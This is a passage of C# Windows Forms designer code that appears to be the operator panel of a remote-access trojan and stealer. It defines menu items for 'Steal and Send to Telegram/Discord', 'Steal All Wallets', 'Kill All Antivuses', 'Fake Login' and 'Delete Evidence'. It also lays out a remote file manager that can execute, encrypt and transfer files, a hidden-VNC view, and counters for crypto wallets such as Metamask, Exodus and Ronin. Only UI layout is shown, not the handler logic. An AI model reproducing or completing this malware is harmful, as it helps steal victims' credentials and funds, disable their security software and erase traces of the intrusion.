            this.comodoToolStripMenuItem.Click += new System.EventHandler(comodoToolStripMenuItem_Click);
            this.yandexToolStripMenuItem.Name = "yandexToolStripMenuItem";
            this.yandexToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.yandexToolStripMenuItem.Text = "Yandex";
            this.yandexToolStripMenuItem.Visible = false;
            this.yandexToolStripMenuItem.Click += new System.EventHandler(yandexToolStripMenuItem_Click);
            this.operaNeonToolStripMenuItem.Name = "operaNeonToolStripMenuItem";
            this.operaNeonToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.operaNeonToolStripMenuItem.Text = "Opera Neon";
            this.operaNeonToolStripMenuItem.Click += new System.EventHandler(operaNeonToolStripMenuItem_Click);
            this.waterFoxToolStripMenuItem.Name = "waterFoxToolStripMenuItem";
            this.waterFoxToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.waterFoxToolStripMenuItem.Text = "WaterFox";
            this.waterFoxToolStripMenuItem.Click += new System.EventHandler(waterFoxToolStripMenuItem_Click);
            this.orbitumToolStripMenuItem.Name = "orbitumToolStripMenuItem";
            this.orbitumToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.orbitumToolStripMenuItem.Text = "Orbitum";
            this.orbitumToolStripMenuItem.Click += new System.EventHandler(orbitumToolStripMenuItem_Click);
            this.atomToolStripMenuItem.Name = "atomToolStripMenuItem";
            this.atomToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.atomToolStripMenuItem.Text = "Atom";
            this.atomToolStripMenuItem.Click += new System.EventHandler(atomToolStripMenuItem_Click);
            this.slimjetToolStripMenuItem.Name = "slimjetToolStripMenuItem";
            this.slimjetToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.slimjetToolStripMenuItem.Text = "Slimjet";
            this.slimjetToolStripMenuItem.Click += new System.EventHandler(slimjetToolStripMenuItem_Click);
            this.contextMenuStrip5.Items.AddRange(new System.Windows.Forms.ToolStripItem[11]
            {
                this.msinfo32exeToolStripMenuItem, this.mstscexeToolStripMenuItem, this.notepadToolStripMenuItem, this.controlPanelToolStripMenuItem, this.powershellToolStripMenuItem, this.cMDToolStripMenuItem, this.explorerToolStripMenuItem, this.copyToolStripMenuItem, this.pasteToolStripMenuItem, this.fakeLoginToolStripMenuItem,
                this.killAllAntivusesToolStripMenuItem
            });
            this.contextMenuStrip5.Name = "contextMenuStrip1";
            this.contextMenuStrip5.Size = new System.Drawing.Size(162, 246);
            this.msinfo32exeToolStripMenuItem.Name = "msinfo32exeToolStripMenuItem";
            this.msinfo32exeToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.msinfo32exeToolStripMenuItem.Text = "msinfo32.exe";
            this.msinfo32exeToolStripMenuItem.Click += new System.EventHandler(msinfo32exeToolStripMenuItem_Click);
            this.mstscexeToolStripMenuItem.Name = "mstscexeToolStripMenuItem";
            this.mstscexeToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.mstscexeToolStripMenuItem.Text = "mstsc.exe";
            this.mstscexeToolStripMenuItem.Click += new System.EventHandler(mstscexeToolStripMenuItem_Click);
            this.notepadToolStripMenuItem.Name = "notepadToolStripMenuItem";
            this.notepadToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.notepadToolStripMenuItem.Text = "Notepad";
            this.notepadToolStripMenuItem.Click += new System.EventHandler(notepadToolStripMenuItem_Click);
            this.controlPanelToolStripMenuItem.Name = "controlPanelToolStripMenuItem";
            this.controlPanelToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.controlPanelToolStripMenuItem.Text = "Control Panel";
            this.controlPanelToolStripMenuItem.Click += new System.EventHandler(controlPanelToolStripMenuItem_Click);
            this.powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
            this.powershellToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.powershellToolStripMenuItem.Text = "Powershell";
            this.powershellToolStripMenuItem.Click += new System.EventHandler(btnPowershell_Click);
            this.cMDToolStripMenuItem.Name = "cMDToolStripMenuItem";
            this.cMDToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.cMDToolStripMenuItem.Text = "CMD";
            this.cMDToolStripMenuItem.Click += new System.EventHandler(btnCMD_Click);
            this.explorerToolStripMenuItem.Name = "explorerToolStripMenuItem";
            this.explorerToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.explorerToolStripMenuItem.Text = "Explorer";
            this.explorerToolStripMenuItem.Click += new System.EventHandler(btnEx_Click);
            this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
            this.copyToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.copyToolStripMenuItem.Text = "Copy ";
            this.copyToolStripMenuItem.Click += new System.EventHandler(btnCopy_Click);
            this.pasteToolStripMenuItem.Name = "pasteToolStripMenuItem";
            this.pasteToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.pasteToolStripMenuItem.Text = "Paste";
            this.pasteToolStripMenuItem.Click += new System.EventHandler(btnPaste_Click);
            this.fakeLoginToolStripMenuItem.Name = "fakeLoginToolStripMenuItem";
            this.fakeLoginToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.fakeLoginToolStripMenuItem.Text = "Fake Login";
            this.fakeLoginToolStripMenuItem.Visible = false;
            this.fakeLoginToolStripMenuItem.Click += new System.EventHandler(fakeLoginToolStripMenuItem_Click);
            this.killAllAntivusesToolStripMenuItem.Name = "killAllAntivusesToolStripMenuItem";
            this.killAllAntivusesToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.killAllAntivusesToolStripMenuItem.Text = "Kill All Antivuses";
            this.killAllAntivusesToolStripMenuItem.Click += new System.EventHandler(killAllAntivusesToolStripMenuItem_Click);
            this.timer3.Enabled = true;
            this.timer3.Interval = 1000;
            this.timer3.Tick += new System.EventHandler(timer3_Tick);
            this.contextMenuStrip6.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.stealAndSendToTelegramToolStripMenuItem, this.stealAndSendToDiscordToolStripMenuItem, this.stealAllWalletsToolStripMenuItem, this.downloadLogsViaSocketToolStripMenuItem, this.clearEvidenceToolStripMenuItem });
            this.contextMenuStrip6.Name = "contextMenuStrip1";
            this.contextMenuStrip6.Size = new System.Drawing.Size(262, 114);
            this.stealAndSendToTelegramToolStripMenuItem.Name = "stealAndSendToTelegramToolStripMenuItem";
            this.stealAndSendToTelegramToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.stealAndSendToTelegramToolStripMenuItem.Text = "Steal and Send to Telegram/Discord";
            this.stealAndSendToTelegramToolStripMenuItem.Click += new System.EventHandler(stealAndSendToTelegramToolStripMenuItem_Click);
            this.stealAndSendToDiscordToolStripMenuItem.Name = "stealAndSendToDiscordToolStripMenuItem";
            this.stealAndSendToDiscordToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.stealAndSendToDiscordToolStripMenuItem.Text = "Steal and Send to Discord";
            this.stealAndSendToDiscordToolStripMenuItem.Visible = false;
            this.stealAndSendToDiscordToolStripMenuItem.Click += new System.EventHandler(stealAndSendToDiscordToolStripMenuItem_Click);
            this.stealAllWalletsToolStripMenuItem.Name = "stealAllWalletsToolStripMenuItem";
            this.stealAllWalletsToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.stealAllWalletsToolStripMenuItem.Text = "Steal All Wallets";
            this.stealAllWalletsToolStripMenuItem.Click += new System.EventHandler(stealAllWalletsToolStripMenuItem_Click);
            this.downloadLogsViaSocketToolStripMenuItem.Name = "downloadLogsViaSocketToolStripMenuItem";
            this.downloadLogsViaSocketToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.downloadLogsViaSocketToolStripMenuItem.Text = "Download Logs via Socket";
            this.downloadLogsViaSocketToolStripMenuItem.ToolTipText = "Before you use this option make sure you run the stealer with option socket!";
            this.downloadLogsViaSocketToolStripMenuItem.Visible = false;
            this.downloadLogsViaSocketToolStripMenuItem.Click += new System.EventHandler(downloadLogsViaSocketToolStripMenuItem_Click);
            this.clearEvidenceToolStripMenuItem.Name = "clearEvidenceToolStripMenuItem";
            this.clearEvidenceToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.clearEvidenceToolStripMenuItem.Text = "Delete Evidence";
            this.clearEvidenceToolStripMenuItem.Click += new System.EventHandler(clearEvidenceToolStripMenuItem_Click);
            this.timer4.Tick += new System.EventHandler(timer4_Tick);
            this.contextMenuStrip7.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.startToolStripMenuItem, this.stopToolStripMenuItem });
            this.contextMenuStrip7.Name = "contextMenuStrip1";
            this.contextMenuStrip7.Size = new System.Drawing.Size(99, 48);
            this.startToolStripMenuItem.Name = "startToolStripMenuItem";
            this.startToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.startToolStripMenuItem.Text = "Start";
            this.startToolStripMenuItem.Click += new System.EventHandler(startToolStripMenuItem_Click);
            this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
            this.stopToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.stopToolStripMenuItem.Text = "Stop";
            this.stopToolStripMenuItem.Click += new System.EventHandler(stopToolStripMenuItem_Click);
            this.timer5.Tick += new System.EventHandler(timer5_Tick);
            this.timer6.Tick += new System.EventHandler(timer6_Tick);
            this.timer7.Tick += new System.EventHandler(timer7_Tick);
            this.timer8.Tick += new System.EventHandler(timer8_Tick);
            this.timer9.Tick += new System.EventHandler(timer9_Tick);
            this.FileManagerContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[12]
            {
                this.networkingToolStripMenuItem, this.toolStripSeparator3, this.executeFileToolStripMenuItem, this.createDirectoryToolStripMenuItem, this.refreshDirectoryToolStripMenuItem, this.toolStripSeparator4, this.deleteFolderFileToolStripMenuItem, this.cryptographyToolStripMenuItem, this.blockFileToolStripMenuItem, this.toolStripSeparator5,
                this.searchDirectoryToolStripMenuItem, this.searchForFileToolStripMenuItem
            });
            this.FileManagerContextMenuStrip.Name = "contextMenuStrip1";
            this.FileManagerContextMenuStrip.Size = new System.Drawing.Size(165, 220);
            this.networkingToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.downloadFIleToolStripMenuItem, this.uploadFileToolStripMenuItem });
            this.networkingToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("networkingToolStripMenuItem.Image");
            this.networkingToolStripMenuItem.Name = "networkingToolStripMenuItem";
            this.networkingToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.networkingToolStripMenuItem.Text = "Networking";
            this.downloadFIleToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("downloadFIleToolStripMenuItem.Image");
            this.downloadFIleToolStripMenuItem.Name = "downloadFIleToolStripMenuItem";
            this.downloadFIleToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.downloadFIleToolStripMenuItem.Text = "Download File";
            this.uploadFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("uploadFileToolStripMenuItem.Image");
            this.uploadFileToolStripMenuItem.Name = "uploadFileToolStripMenuItem";
            this.uploadFileToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.uploadFileToolStripMenuItem.Text = "Upload File";
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(161, 6);
            this.executeFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("executeFileToolStripMenuItem.Image");
            this.executeFileToolStripMenuItem.Name = "executeFileToolStripMenuItem";
            this.executeFileToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.executeFileToolStripMenuItem.Text = "Execute File";
            this.createDirectoryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("createDirectoryToolStripMenuItem.Image");
            this.createDirectoryToolStripMenuItem.Name = "createDirectoryToolStripMenuItem";
            this.createDirectoryToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.createDirectoryToolStripMenuItem.Text = "Create Directory";
            this.refreshDirectoryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("refreshDirectoryToolStripMenuItem.Image");
            this.refreshDirectoryToolStripMenuItem.Name = "refreshDirectoryToolStripMenuItem";
            this.refreshDirectoryToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.refreshDirectoryToolStripMenuItem.Text = "Refresh Directory";
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new System.Drawing.Size(161, 6);
            this.deleteFolderFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("deleteFolderFileToolStripMenuItem.Image");
            this.deleteFolderFileToolStripMenuItem.Name = "deleteFolderFileToolStripMenuItem";
            this.deleteFolderFileToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.deleteFolderFileToolStripMenuItem.Text = "Delete Item(s)";
            this.cryptographyToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.encryptFileToolStripMenuItem, this.decryptFileToolStripMenuItem });
            this.cryptographyToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("cryptographyToolStripMenuItem.Image");
            this.cryptographyToolStripMenuItem.Name = "cryptographyToolStripMenuItem";
            this.cryptographyToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.cryptographyToolStripMenuItem.Text = "Cryptography";
            this.encryptFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("encryptFileToolStripMenuItem.Image");
            this.encryptFileToolStripMenuItem.Name = "encryptFileToolStripMenuItem";
            this.encryptFileToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.encryptFileToolStripMenuItem.Text = "Encrypt File";
            this.decryptFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("decryptFileToolStripMenuItem.Image");
            this.decryptFileToolStripMenuItem.Name = "decryptFileToolStripMenuItem";
            this.decryptFileToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.decryptFileToolStripMenuItem.Text = "Decrypt File";
            this.blockFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("blockFileToolStripMenuItem.Image");
            this.blockFileToolStripMenuItem.Name = "blockFileToolStripMenuItem";
            this.blockFileToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.blockFileToolStripMenuItem.Text = "Block Item(s)";
            this.toolStripSeparator5.Name = "toolStripSeparator5";
            this.toolStripSeparator5.Size = new System.Drawing.Size(161, 6);
            this.searchDirectoryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("searchDirectoryToolStripMenuItem.Image");
            this.searchDirectoryToolStripMenuItem.Name = "searchDirectoryToolStripMenuItem";
            this.searchDirectoryToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.searchDirectoryToolStripMenuItem.Text = "Search for Folder";
            this.searchForFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("searchForFileToolStripMenuItem.Image");
            this.searchForFileToolStripMenuItem.Name = "searchForFileToolStripMenuItem";
            this.searchForFileToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.searchForFileToolStripMenuItem.Text = "Search for File";
            this.FileManagerImageList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("FileManagerImageList.ImageStream");
            this.FileManagerImageList.TransparentColor = System.Drawing.Color.Transparent;
            this.FileManagerImageList.Images.SetKeyName(0, "Folder_16px.png");
            this.FileManagerImageList.Images.SetKeyName(1, "File_16px.png");
            this.FileManagerImageList.Images.SetKeyName(2, "SSD_16px.png");
            this.FileManagerImageList.Images.SetKeyName(3, "ThickArrowPointingUp_16px.png");
            this.FileManagerImageList.Images.SetKeyName(4, "CD_16px.png");
            this.timer10.Interval = 500000;
            this.timer10.Tick += new System.EventHandler(timer10_Tick);
            this.timer11.Enabled = true;
            this.timer11.Interval = 5000;
            this.timer11.Tick += new System.EventHandler(timer11_Tick);
            this.statusStrip1.BackColor = System.Drawing.Color.White;
            this.statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
            this.statusStrip1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.statusStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Visible;
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripStatusLabel3, this.PingStatusLabel });
            this.statusStrip1.Location = new System.Drawing.Point(1, 7);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(69, 22);
            this.statusStrip1.SizingGrip = false;
            this.statusStrip1.TabIndex = 19;
            this.toolStripStatusLabel3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Bold);
            this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.Black;
            this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
            this.toolStripStatusLabel3.Size = new System.Drawing.Size(43, 17);
            this.toolStripStatusLabel3.Text = "Status";
            this.PingStatusLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Bold);
            this.PingStatusLabel.ForeColor = System.Drawing.Color.SteelBlue;
            this.PingStatusLabel.Name = "PingStatusLabel";
            this.PingStatusLabel.Size = new System.Drawing.Size(62, 17);
            this.PingStatusLabel.Text = "Ping: 0ms";
            this.PingStatusLabel.Visible = false;
            this.panel4.BackColor = System.Drawing.Color.White;
            this.panel4.Controls.Add(this.txtRes);
            this.panel4.Controls.Add(this.statusStrip1);
            this.panel4.Controls.Add(this.txtFPS);
            this.panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel4.Location = new System.Drawing.Point(3, 699);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(1129, 33);
            this.panel4.TabIndex = 32;
            this.txtRes.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            this.txtRes.AutoSize = true;
            this.txtRes.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Bold);
            this.txtRes.ForeColor = System.Drawing.Color.SteelBlue;
            this.txtRes.Location = new System.Drawing.Point(572, 10);
            this.txtRes.Name = "txtRes";
            this.txtRes.Size = new System.Drawing.Size(67, 13);
            this.txtRes.TabIndex = 113;
            this.txtRes.Text = "Resolution";
            this.txtRes.Visible = false;
            this.txtFPS.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            this.txtFPS.AutoSize = true;
            this.txtFPS.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Bold);
            this.txtFPS.ForeColor = System.Drawing.Color.SteelBlue;
            this.txtFPS.Location = new System.Drawing.Point(880, 12);
            this.txtFPS.Name = "txtFPS";
            this.txtFPS.Size = new System.Drawing.Size(32, 13);
            this.txtFPS.TabIndex = 112;
            this.txtFPS.Text = "CPU";
            this.VNCBox.BackgroundImage = (System.Drawing.Image)resources.GetObject("VNCBox.BackgroundImage");
            this.VNCBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.VNCBox.Dock = System.Windows.Forms.DockStyle.Fill;
            this.VNCBox.Location = new System.Drawing.Point(3, 3);
            this.VNCBox.Name = "VNCBox";
            this.VNCBox.Size = new System.Drawing.Size(1129, 696);
            this.VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.VNCBox.TabIndex = 7;
            this.VNCBox.TabStop = false;
            this.VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseDown);
            this.VNCBox.MouseEnter += new System.EventHandler(VNCBox_MouseEnter_1);
            this.VNCBox.MouseHover += new System.EventHandler(VNCBox_MouseHover);
            this.VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseMove);
            this.VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseUp);
            this.groupBox6.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            this.groupBox6.ContextMenuStrip = this.contextMenuStrip1;
            this.groupBox6.Controls.Add(this.IntervalScroll);
            this.groupBox6.Controls.Add(this.QualityLabel);
            this.groupBox6.Controls.Add(this.IntervalLabel);
            this.groupBox6.Controls.Add(this.QualityScroll);
            this.groupBox6.Controls.Add(this.ShowStart);
            this.groupBox6.Controls.Add(this.btnInfo);
            this.groupBox6.Controls.Add(this.studioButton12);
            this.groupBox6.Controls.Add(this.button3);
            this.groupBox6.Controls.Add(this.btnClip);
            this.groupBox6.Location = new System.Drawing.Point(145, 123);
            this.groupBox6.Name = "groupBox6";
            this.groupBox6.Size = new System.Drawing.Size(844, 181);
            this.groupBox6.TabIndex = 31;
            this.groupBox6.TabStop = false;
            this.groupBox6.Visible = false;
            this.IntervalScroll.AutoSize = false;
            this.IntervalScroll.Location = new System.Drawing.Point(119, 19);
            this.IntervalScroll.Maximum = 1000;
            this.IntervalScroll.Minimum = 10;
            this.IntervalScroll.Name = "IntervalScroll";
            this.IntervalScroll.Size = new System.Drawing.Size(104, 26);
            this.IntervalScroll.TabIndex = 8;
            this.IntervalScroll.TickStyle = System.Windows.Forms.TickStyle.None;
            this.IntervalScroll.Value = 500;
            this.IntervalScroll.Scroll += new System.EventHandler(IntervalScroll_Scroll);
            this.QualityLabel.AutoSize = true;
            this.QualityLabel.Location = new System.Drawing.Point(213, 18);
            this.QualityLabel.Name = "QualityLabel";
            this.QualityLabel.Size = new System.Drawing.Size(85, 15);
            this.QualityLabel.TabIndex = 5;
            this.QualityLabel.Text = "Quality : 100%";
            this.IntervalLabel.AutoSize = true;
            this.IntervalLabel.Location = new System.Drawing.Point(9, 18);
            this.IntervalLabel.Name = "IntervalLabel";
            this.IntervalLabel.Size = new System.Drawing.Size(101, 15);
            this.IntervalLabel.TabIndex = 6;
            this.IntervalLabel.Text = "Interval (ms): 500";
            this.QualityScroll.AutoSize = false;
            this.QualityScroll.Location = new System.Drawing.Point(312, 17);
            this.QualityScroll.Maximum = 100;
            this.QualityScroll.Name = "QualityScroll";
            this.QualityScroll.Size = new System.Drawing.Size(104, 26);
            this.QualityScroll.TabIndex = 9;
            this.QualityScroll.TickStyle = System.Windows.Forms.TickStyle.None;
            this.QualityScroll.Value = 100;
            this.QualityScroll.Scroll += new System.EventHandler(QualityScroll_Scroll);
            this.ShowStart.Location = new System.Drawing.Point(-2, 34);
            this.ShowStart.Name = "ShowStart";
            this.ShowStart.Size = new System.Drawing.Size(40, 40);
            this.ShowStart.TabIndex = 2;
            this.ShowStart.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.ShowStart.UseVisualStyleBackColor = true;
            this.ShowStart.Click += new System.EventHandler(ShowStart_Click);
            this.btnInfo.Location = new System.Drawing.Point(44, 64);
            this.btnInfo.Name = "btnInfo";
            this.btnInfo.Size = new System.Drawing.Size(94, 25);
            this.btnInfo.TabIndex = 110;
            this.btnInfo.Text = "Get Info";
            this.btnInfo.UseVisualStyleBackColor = true;
            this.btnInfo.Click += new System.EventHandler(btnInfo_Click);
            this.studioButton12.Location = new System.Drawing.Point(45, 122);
            this.studioButton12.Name = "studioButton12";
            this.studioButton12.Size = new System.Drawing.Size(94, 25);
            this.studioButton12.TabIndex = 92;
            this.studioButton12.Text = "Get Logs";
            this.studioButton12.UseVisualStyleBackColor = true;
            this.studioButton12.Click += new System.EventHandler(studioButton12_Click);
            this.button3.Location = new System.Drawing.Point(45, 153);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(92, 23);
            this.button3.TabIndex = 85;
            this.btnClip.Location = new System.Drawing.Point(45, 91);
            this.btnClip.Name = "btnClip";
            this.btnClip.Size = new System.Drawing.Size(94, 25);
            this.btnClip.TabIndex = 95;
            this.btnClip.Text = "Get Clip";
            this.btnClip.UseVisualStyleBackColor = true;
            this.btnClip.Click += new System.EventHandler(btnClip_Click);
            this.txtZilpay.AutoSize = true;
            this.txtZilpay.BackColor = System.Drawing.Color.White;
            this.txtZilpay.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtZilpay.ForeColor = System.Drawing.Color.Red;
            this.txtZilpay.Location = new System.Drawing.Point(340, 620);
            this.txtZilpay.Name = "txtZilpay";
            this.txtZilpay.Size = new System.Drawing.Size(15, 16);
            this.txtZilpay.TabIndex = 329;
            this.txtZilpay.Text = "0";
            this.txtRonin.AutoSize = true;
            this.txtRonin.BackColor = System.Drawing.Color.White;
            this.txtRonin.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtRonin.ForeColor = System.Drawing.Color.Red;
            this.txtRonin.Location = new System.Drawing.Point(1019, 557);
            this.txtRonin.Name = "txtRonin";
            this.txtRonin.Size = new System.Drawing.Size(15, 16);
            this.txtRonin.TabIndex = 328;
            this.txtRonin.Text = "0";
            this.txtExodusE.AutoSize = true;
            this.txtExodusE.BackColor = System.Drawing.Color.White;
            this.txtExodusE.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtExodusE.ForeColor = System.Drawing.Color.Red;
            this.txtExodusE.Location = new System.Drawing.Point(519, 620);
            this.txtExodusE.Name = "txtExodusE";
            this.txtExodusE.Size = new System.Drawing.Size(15, 16);
            this.txtExodusE.TabIndex = 326;
            this.txtExodusE.Text = "0";
            this.txtYoroi.AutoSize = true;
            this.txtYoroi.BackColor = System.Drawing.Color.White;
            this.txtYoroi.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtYoroi.ForeColor = System.Drawing.Color.Red;
            this.txtYoroi.Location = new System.Drawing.Point(163, 620);
            this.txtYoroi.Name = "txtYoroi";
            this.txtYoroi.Size = new System.Drawing.Size(15, 16);
            this.txtYoroi.TabIndex = 325;
            this.txtYoroi.Text = "0";
            this.label57.AutoSize = true;
            this.label57.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label57.Location = new System.Drawing.Point(451, 620);
            this.label57.Name = "label57";
            this.label57.Size = new System.Drawing.Size(40, 12);
            this.label57.TabIndex = 319;
            this.label57.Text = "Exodus";
            this.label59.AutoSize = true;
            this.label59.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label59.Location = new System.Drawing.Point(967, 557);
            this.label59.Name = "label59";
            this.label59.Size = new System.Drawing.Size(33, 12);
            this.label59.TabIndex = 317;
            this.label59.Text = "Ronin";
            this.label60.AutoSize = true;
            this.label60.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label60.Location = new System.Drawing.Point(263, 620);
            this.label60.Name = "label60";
            this.label60.Size = new System.Drawing.Size(35, 12);
            this.label60.TabIndex = 316;
            this.label60.Text = "Zilpay";
            this.label61.AutoSize = true;
            this.label61.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label61.Location = new System.Drawing.Point(111, 620);
            this.label61.Name = "label61";
            this.label61.Size = new System.Drawing.Size(31, 12);
            this.label61.TabIndex = 315;
            this.label61.Text = "Yoroi";
            this.txtMetamaskE.AutoSize = true;
            this.txtMetamaskE.BackColor = System.Drawing.Color.White;
            this.txtMetamaskE.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtMetamaskE.ForeColor = System.Drawing.Color.Red;
            this.txtMetamaskE.Location = new System.Drawing.Point(340, 557);
            this.txtMetamaskE.Name = "txtMetamaskE";
            this.txtMetamaskE.Size = new System.Drawing.Size(15, 16);
            this.txtMetamaskE.TabIndex = 314;
            this.txtMetamaskE.Text = "0";
            this.txtRabet.AutoSize = true;
            this.txtRabet.BackColor = System.Drawing.Color.White;
            this.txtRabet.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtRabet.ForeColor = System.Drawing.Color.Red;
            this.txtRabet.Location = new System.Drawing.Point(865, 557);
            this.txtRabet.Name = "txtRabet";
            this.txtRabet.Size = new System.Drawing.Size(15, 16);
            this.txtRabet.TabIndex = 313;
            this.txtRabet.Text = "0";
            this.txtMTVS.AutoSize = true;
            this.txtMTVS.BackColor = System.Drawing.Color.White;
            this.txtMTVS.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtMTVS.ForeColor = System.Drawing.Color.Red;
            this.txtMTVS.Location = new System.Drawing.Point(693, 557);
            this.txtMTVS.Name = "txtMTVS";
            this.txtMTVS.Size = new System.Drawing.Size(15, 16);
            this.txtMTVS.TabIndex = 312;
            this.txtMTVS.Text = "0";
            this.txtMathE.AutoSize = true;
            this.txtMathE.BackColor = System.Drawing.Color.White;
            this.txtMathE.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtMathE.ForeColor = System.Drawing.Color.Red;
            this.txtMathE.Location = new System.Drawing.Point(519, 557);
            this.txtMathE.Name = "txtMathE";
